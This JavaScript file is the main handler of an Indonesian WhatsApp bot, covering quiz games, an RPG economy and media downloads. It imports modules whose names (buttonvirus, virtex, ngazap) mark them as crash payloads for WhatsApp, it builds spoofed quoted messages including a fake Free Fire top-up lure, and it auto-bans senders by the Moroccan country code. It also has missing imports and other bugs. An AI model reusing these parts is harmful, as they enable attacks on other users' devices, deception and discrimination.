// Kalau Mao Copas Kasih Tqto Goblok
// Tqto Akira
// Jangan Hapus Tqto Yaa

require('./settings') 
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { FajarNews, 
BBCNews, 
metroNews, 
CNNNews, 
iNews, 
KumparanNews, 
TribunNews, 
DailyNews, 
DetikNews,   
OkezoneNews, 
CNBCNews, 
KompasNews, 
SindoNews, 
TempoNews, 
IndozoneNews, 
AntaraNews, 
RpublikaNews,  
VivaNews, 
KontanNews, 
MerdekaNews, 
KomikuSearch, 
AniPlanetSearch, 
KomikFoxSearch, 
KomikStationSearch, 
MangakuSearch, 
KiryuuSearch, 
KissMangaSearch, 
KlikMangaSearch, 
PalingMurah, 
LayarKaca21, 
AminoApps, 
Mangatoon, 
WAModsSearch, 
Emojis, 
CoronaInfo, 
JalanTikusMeme, 
Cerpen, 
Quotes, 
Couples, 
Darkjokes } = require('dhn-api')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const crypto = require('crypto')
const { exec, spawn, execSync } = require('child_process')
const process = require('process') 
const axios = require('axios')
const path = require('path')
const os = require('os')
const jimp = require('jimp')
const hxz = require('hxz-api')
const caliph = require('caliph-api')
const moment = require('moment-timezone')
const maker = require('mumaker')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const yts = require('yt-search')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const fetch = require('node-fetch')
const ffmpeg = require('fluent-ffmpeg')
const ms = require('parse-ms')
const toMs = require('ms')

const akira = require('./Lib/scrape')
const { buttonvirus } = require('./Lib/buttonvirus')
const { virtex } = require('./Lib/virtex')
const { vweb1 } = require('./Lib/vweb1')
const { vweb4 } = require('./Lib/vweb4')
const { vweb6 } = require('./Lib/vweb6')
const { ngazapv1 } = require('./Lib/ngazapv1')
const { ngazapv2 } = require('./Lib/ngazapv2')
const { ngazapv3 } = require('./Lib/ngazapv3')
const { cerpen } = require('./Lib/cerpen')
const { pinterest } = require('./Lib/scraper')
const _sewa = require('./Lib/sewa')
const { color, bgcolor } = require('./Lib/color')
const { toAudio, toPTT, toVideo } = require('./Lib/converter')
const { addLevelingId, addLevelingLevel, addLevelingXp, getLevelingId, getLevelingLevel, getLevelingXp } = require('./Lib/level')
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require('./Lib/limit')
const { checkPetualangUser, addInventori, addBesi, sellBesi, getBesi, addDm, sellDm, getDm, addEmas, sellEmas, getEmas, addFish, sellFish, getFish } = require('./Lib/rpg')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize } = require('./Lib/myfunc')

const tebaklagu = JSON.parse(fs.readFileSync('./Database/tebaklagu.json'))
const kuismath = JSON.parse(fs.readFileSync('./Database/math.json'))
const tebakgambar = JSON.parse(fs.readFileSync('./Database/tebakgambar.json'))
const tebakkata = JSON.parse(fs.readFileSync('./Database/tebakkata.json'))
const caklontong = JSON.parse(fs.readFileSync('./Database/lontong.json'))
const caklontong_desk = JSON.parse(fs.readFileSync('./Database/lontong_desk.json'))
const tebakkalimat = JSON.parse(fs.readFileSync('./Database/kalimat.json'))
const tebaklirik = JSON.parse(fs.readFileSync('./Database/lirik.json'))
const tebaktebakan = JSON.parse(fs.readFileSync('./Database/tebakan.json'))

const owner = JSON.parse(fs.readFileSync('./Database/owner.json').toString())
const sewa = JSON.parse(fs.readFileSync('./Database/sewa.json'))
const _level = JSON.parse(fs.readFileSync('./Database/leveluser.json'))
const _petualang = JSON.parse(fs.readFileSync('./Database/inventori.json'))
const balance = JSON.parse(fs.readFileSync('./Database/balance.json'))
const autosticker = JSON.parse(fs.readFileSync('./Database/autosticker.json'))
const prem = JSON.parse(fs.readFileSync('./Database/premium.json'))

blocked = []
const turbrek = `break`

module.exports = kirbotz = async (kirbotz, m, chatUpdate, store) => {
try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        var content = JSON.stringify(m.message)
        const { tampilan } = require('./Lib/isinya')
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await kirbotz.decodeJid(kirbotz.user.id)
        const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
	    const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const charger = `${charging ? 'Charging' : 'Discharging'}`
        
    const hariRaya = new Date('January 1, 2023 00:00:00')
    const sekarang = new Date().getTime()
    const Selisih = hariRaya - sekarang
    const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
    const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
    const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
    const ddetik = Math.floor( Selisih % (1000 * 60) / 1000)
	    
	    const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const groupMetadata = m.isGroup ? await kirbotz.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const banUser = await kirbotz.fetchBlocklist()
        const isBan = banUser ? banUser.includes(m.sender) : false
        const isPrem = prem.includes(sender)
        const isPetualang = checkPetualangUser(sender)
        const isSewa = _sewa.checkSewaGroup(from, sewa)
        const floc = {
        key : {
        participant : '0@s.whatsapp.net'
        },
        message: {
        locationMessage: {
        name: `I’m From Indonesia 🇮🇩`,
        jpegThumbnail: thumb
        }
        }
        }
        
var levelRole = getLevelingLevel(sender, _level)
var role = 'Warrior III'
if (levelRole <= 5) {
role = 'Warrior II'
} else if (levelRole <= 10) {
role = 'Warrior I'
} else if (levelRole <= 15) {
role = 'Elite III'
} else if (levelRole <= 20) {
role = 'Elite II'
} else if (levelRole <= 25) {
role = 'Elite I'
} else if (levelRole <= 30) {
role = 'Master III'
} else if (levelRole <= 35) {
role = 'Master II'
} else if (levelRole <= 40) {
role = 'Master I'
} else if (levelRole <= 45) {
role = 'GrandMaster III'
} else if (levelRole <= 50) {
role = 'GrandMaster II'
} else if (levelRole <= 55) {
role = 'GrandMaster I'
} else if (levelRole <= 60) {
role = 'Epic III'
} else if (levelRole <= 65) {
role = 'Epic II'
} else if (levelRole <= 70) {
role = 'Epic I'
} else if (levelRole <= 75) {
role = 'Legend III'
} else if (levelRole <= 80) {
role = 'Legend II'
} else if (levelRole <= 85) {
role = 'Legend I'
} else if (levelRole <= 90) {
role = 'Mythic'
} else if (levelRole <= 95) {
role = 'Mythical Glory'
} else if (levelRole >= 100) {
role = 'Immortal'
} 

var ikan = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐡','🐙']
var hewan = ['🐔','🦃','🦆','🐐','🐏','🐖','🐑','🐎']
var burung = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']        
var petnya = ['😾','🐺','🦊','🐶','🐰']
var makan = ['🌭','🌮','🌯','🍙','🍝','🍕','🍘','🍟','🍞','🍖','🍡']
var buahan = ['🍇','🍎','🍏','🍐','🍒','🍊','🍋','🍑','🍓']

var elit = 'Petualang Biasa'
if (isPrem)
{
elit = 'Petualang Pro'
}
if (isCreator)
{
elit = 'Admin Game'
}

try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
           
} catch (err) {
console.error(err)
}

            if (!kirbotz.public) {
            if (!m.key.fromMe) return
            }

		if (!m.isGroup && isCmd && !fromMe) {
			addBalance(sender, randomNomor(20), balance)
			console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
		}
		if (m.isGroup && isCmd && !fromMe) {
			addBalance(sender, randomNomor(20), balance)
			console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
		}
		
		
		
		if (m.sender.startsWith('212')) return kirbotz.updateBlockStatus(m.sender, 'block')

	    kirbotz.sendReadReceipt(from, sender, [m.key.id])
		kirbotz.sendPresenceUpdate('available', from)
		
		if (m.sender.startsWith('212')) return kirbotz.groupParticipantsUpdate(m.chat, [sender], 'remove')
		
		try {
        ppuser = await kirbotz.profilePictureUrl(m.sender, 'image')
        } catch (err) {
        ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
        }
        ppnyauser = await getBuffer(ppuser)

        const isFoVid = (type === 'imageMessage' || type === 'videoMessage')
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false

const generateProfilePicture = async(buffer) => {
const jimp_1 = await jimp.read(buffer);
const resz = jimp_1.getWidth() > jimp_1.getHeight() ? jimp_1.resize(550, jimp.AUTO) : jimp_1.resize(jimp.AUTO, 650)
const jimp_2 = await jimp.read(await resz.getBufferAsync(jimp.MIME_JPEG));
return {
img: await resz.getBufferAsync(jimp.MIME_JPEG)
}
}

        const sendFileFromUrl = async (from, url, caption, m, men) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            if (mime.split("/")[1] === "gif") {
                return kirbotz.sendMessage(from, { video: await getBuffer(url), caption: caption, gifPlayback: true, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
                }
            let type = mime.split("/")[0]+"Message"
            if(mime === "application/pdf"){
                return kirbotz.sendMessage(m.chat, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, mentions: men ? men : []}, {quoted: m })
            }
            if(mime.split("/")[0] === "image"){
                return kirbotz.sendMessage(m.chat, { image: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: m})
            }
            if(mime.split("/")[0] === "video"){
                return kirbotz.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m })
            }
            if(mime.split("/")[0] === "audio"){
                return kirbotz.sendMessage(m.chat, { audio: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'audio/mpeg'}, {quoted: m })
            }
        }
	        
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: kirbotz.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, kirbotz.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        kirbotz.ev.emit('messages.upsert', msg)
        }

		const reply = async(teks) => {
        kirbotz.sendMessage(m.chat, { text : teks, mentions: await kirbotz.parseMention(teks), contextInfo : {
        "mentionedJid": [m.sender],
        "externalAdReply": {
        "showAdAttribution": true,
        "title": `Hai Kak ${pushname}👋🏻`, 
        "mediaType": 2, 
        "thumbnail": ppnyauser,
        "previewType": "VIDEO",
        "mediaUrl": `https://youtu.be/b0CCKgVEhlk`,
        "sourceUrl": `https://youtu.be/b0CCKgVEhlk`}}},
        { quoted: m })
        }
	
		const createSerial = (size) => {
        return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

const efff = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
{ remoteJid: "6281903153426-1626053991@g.us" } : {})
},
message: { 
"extendedTextMessage": {
"text": "Topup Diamond Free Fire",
'jpegThumbnail': fs.readFileSync('./Image/diamond.jpg')
}
} 
}

const lep = {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `Kok Fc Bang`, 
"jpegThumbnail": ppnyauser
}
}
}

        const sticWait = (hehe) => {
			ano = fs.readFileSync('./Kir/JANGANDIUBAH/wait.webp')
			kirbotz.sendMessage(hehe, { sticker: ano, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://kirbotz-api.herokuapp.com'}}}, 
			{ quoted: floc })
		}

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, kirbotz.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, kirbotz.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, kirbotz.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, kirbotz.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, kirbotz.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, kirbotz.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await kirbotz.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, kirbotz.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else reply('*Jawaban Salah!*')
        }

_sewa.expiredCheck(kirbotz, sewa)

function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
function monospace(string) {
return '```' + string + '```'
}  

const fakekirbotz = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
  },
  message: {
    imageMessage: {
      mimetype: 'image/jpeg',
      caption: 'Created By BloodSword',
      jpegThumbnail: ppnyauser,
      viewOnce: true
    }
  }
}

const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid, 
"thumbnail": img, 
"itemCount": itcount, 
"status": "INQUIRY", 
"surface": "CATALOG", 
"orderTitle": title, 
"message": text, 
"sellerJid": sellers, 
"token": tokens, 
"totalAmount1000": ammount, 
"totalCurrencyCode": "IDR", 
}
}), { userJid: jid })
kirbotz.relayMessage(jid, order.message, { messageId: order.key.id})
}

function igdl(url){
	return new Promise(async(resolve, reject) => {
		axios.request({
			url: 'https://www.instagramsave.com/download-instagram-videos.php',
			method: 'GET',
			headers:{
				"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
				"cookie": "PHPSESSID=ugpgvu6fgc4592jh7ht9d18v49; _ga=GA1.2.1126798330.1625045680; _gid=GA1.2.1475525047.1625045680; __gads=ID=92b58ed9ed58d147-221917af11ca0021:T=1625045679:RT=1625045679:S=ALNI_MYnQToDW3kOUClBGEzULNjeyAqOtg"
			}
		})
		.then(({ data }) => {
			const $ = cheerio.load(data)
			const token = $('#token').attr('value')
			let config ={
				headers: {
					'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
					"sec-ch-ua": '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
					"cookie": "PHPSESSID=ugpgvu6fgc4592jh7ht9d18v49; _ga=GA1.2.1126798330.1625045680; _gid=GA1.2.1475525047.1625045680; __gads=ID=92b58ed9ed58d147-221917af11ca0021:T=1625045679:RT=1625045679:S=ALNI_MYnQToDW3kOUClBGEzULNjeyAqOtg",
					"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
				},
				data: {
					'url': url,
					'action': 'post',
					'token': token
				}
			}
		axios.post('https://www.instagramsave.com/system/action.php',qs.stringify(config.data), { headers: config.headers })
		.then(({ data }) => {
		resolve(data)
		   })
		})
	.catch(reject)
	})
}

async function ayatKursi() {
   return new Promise( async (resolve, reject) => {
       const scraper = JSON.parse(fs.readFileSync(`./Database/ayatKursi/ayatkursi.json`))
       console.log(scraper)
       const result = {
         nomor: scraper.no,
         tafsir: scraper.tafsir,
         arabic: scraper.arabic,
         latin: scraper.latin,
         translate: scraper.translation
       }
       resolve(result)
   }).catch((err) => {resolve(err) })
}
        
        if (m.isGroup && !m.key.fromMe &&  db.data.chats[m.chat].antilink && !isCreator && !isGroupAdmins){
        if (budy.match(`https://chat.whatsapp.com`)) {
        kirbotz.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
	    kirbotz.groupParticipantsUpdate(m.chat, [sender], 'remove')
		}
	    }
	    
	    if (m.isGroup && !m.key.fromMe &&  db.data.chats[m.chat].antiwame && !isGroupAdmins){
        if (budy.match(`wa.me`)) {
        kirbotz.sendMessage(m.chat, {text: `*Antiwame Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
	    kirbotz.groupParticipantsUpdate(m.chat, [sender], 'remove')
		}
	    }
	    
        async function sendPlay(from, query) {
        var url = await yts(query)
        url = url.videos[0].url
        hxz.youtube(url).then(async(data) => {
        var button = [
		{ urlButton: { displayText: `❃ S O U R C E V I D I O ❃`, url : ` https://youtu.be/${data.id}` } },
		{ urlButton: { displayText: `Script`, url : `${wame}` } },
		{ quickReplyButton: { displayText: `🎥 Video (${data.size})`, id: `${prefix}ytmp4 ${url}` } },
		{ quickReplyButton: { displayText: `🎵 Audio (${data.size_mp3})`, id: `${prefix}ytmp3 ${url}` } },
		{ quickReplyButton: { displayText: `🔍 Search ${data.title}`, id: `${prefix}ytsearch https://youtu.be/${data.id}` } }
		]
        var hg = `*⚐︎ Title :* ${data.title}\n*⚐︎ Quality :* ${data.quality}`
        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: await reSize(data.thumb, 200, 200) }, templateButtons: button, footer: `Pilih Salah Satu Button Dibawah⬇️`, mentions: [sender] })
        }).catch((e) => {
        kirbotz.sendMessage(from, { text: mess.error }, { quoted: m })
        ownerNumber.map( i => kirbotz.sendMessage(from, { text: `Send Play Error : ${e}` }))
        })
        }
        
        async function sendButLoc(from) {
        reqXp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
        var button = [
		{ urlButton: { displayText: `Script`, url : `${wame}` } },
		{ quickReplyButton: { displayText: `Inventori`, id: `${prefix}inventori` } },
		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
		]
        var hg = `📍 𝗣𝗿𝗼𝗳𝗶𝗹𝗲 𝗣𝗹𝗮𝘆𝗲𝗿
 • Nama : ${pushname}
 • Rank : ${role}
 • Status : ${elit}
 • Uang : $${(getBalance(sender, balance))}
 • Xp : ${getLevelingXp(sender)}/${reqXp}
 • Level : ${getLevelingLevel(sender)}
 
🎒 𝗜𝗻𝘃𝗲𝗻𝘁𝗼𝗿𝗶 :
 • Uang : $${(getBalance(sender, balance))}
 • Emas : ${getEmas(sender)}
 • Besi : ${getBesi(sender)}
 • Ikan : ${getFish(sender)}
 • Berlian : ${getDm(sender)}

🏔️ 𝗠𝗲𝗻𝘂 𝗥𝗣𝗚
 × ${prefix}joinrpg
 × ${prefix}quest 
 × ${prefix}mining
 × ${prefix}mancing
 × ${prefix}luckyday
 × ${prefix}luckytime
 × ${prefix}adventure
 × ${prefix}inventori
 
⚔️ 𝗙𝗮𝗿𝗺𝗶𝗻𝗴 𝗥𝗣𝗚
 × ${prefix}killslime
 × ${prefix}killgoblin
 × ${prefix}killdevil
 × ${prefix}killbehemoth
 × ${prefix}killdemon
 × ${prefix}killdemonking 
 
🛒 𝗦𝗲𝗹𝗹 𝗜𝗻𝘃𝗲𝗻𝘁𝗼𝗿𝘆
 × ${prefix}sellikan
 × ${prefix}sellbesi
 × ${prefix}sellemas
 × ${prefix}selldiamond`
        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: await reSize(thumbrpg, 200, 200) }, templateButtons: button, footer: `Rpg Game By KirBotz`, mentions: [sender] })
        .catch ((err) => reply(err))
        }
        
        async function sendButJoin(from, query) {
        reqXp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
        _petualang.push(sender)
        fs.writeFileSync('./Database/inventori.json', JSON.stringify(_petualang))        
        addInventori(sender)
        addLevelingId(sender) 
        var name = args[0]
        var serialUser = createSerial(14)
        reqXp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
        var button = [
		{ urlButton: { displayText: `Script`, url : `${wame}` } },
		{ quickReplyButton: { displayText: `Rpg Menu`, id: `${prefix}rpgmenu` } },
		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
		]
        var hg = `〘 SUKSES JOIN RPG 〙
        
「 PROFILE 」
 • Nama : ${name}
 • Level : ${getLevelingLevel(sender)}
 • Status : ${elit}
 • Xp :  ${getLevelingXp(sender)}/${reqXp}
「 RPG GAME 」`
        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgjoinrpg }, templateButtons: button, footer: `Rpg Game By KirBotz`, mentions: [sender] })
        .catch ((err) => reply(err))
        }
        
        async function sendButslime(from) {
ez = Math.ceil(Math.random() * 400)
addLevelingXp(sender, ez)
a = randomNomor(55)
b = randomNomor(400)
c = randomNomor(80)
d = randomNomor(3)
addLevelingXp(sender, ez)
addBalance(sender, b, balance)
addEmas(sender, a)
addBesi(sender, c)
addDm(sender, d)
        var button = [
		{ urlButton: { displayText: `Script`, url : `${wame}` } },
		{ quickReplyButton: { displayText: `Inventori`, id: `${prefix}inventori` } },
		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
		]
        var hg = `☠️ 𝗠𝗶𝘀𝗶 𝗠𝗲𝗺𝗯𝘂𝗻𝘂𝗵 𝗦𝗹𝗶𝗺𝗲️\n\n🎁 Hadiah Membunuh Slime\n • Uang : $${b}\n • Besi : ${c}\n • Emas : ${a}\n • Diamond : ${d}\n\nTerimakasih Telah Menjalankan Misi Ini>_<`
        kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgslime }, templateButtons: button, footer: `Rpg Game By KirBotz`, mentions: [sender] })
        .catch ((err) => reply(err))
        }
        
async function sendButgoblin(from) {
ez = Math.ceil(Math.random() * 500)
addLevelingXp(sender, ez)
a = randomNomor(65)
b = randomNomor(500)
c = randomNomor(90)
d = randomNomor(5)
addLevelingXp(sender, ez)
addBalance(sender, b, balance)
addEmas(sender, a)
addBesi(sender, c)
addDm(sender, d)
var button = [
		{ urlButton: { displayText: `Script`, url : `${wame}` } },
		{ quickReplyButton: { displayText: `Inventori`, id: `${prefix}inventori` } },
		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
		]
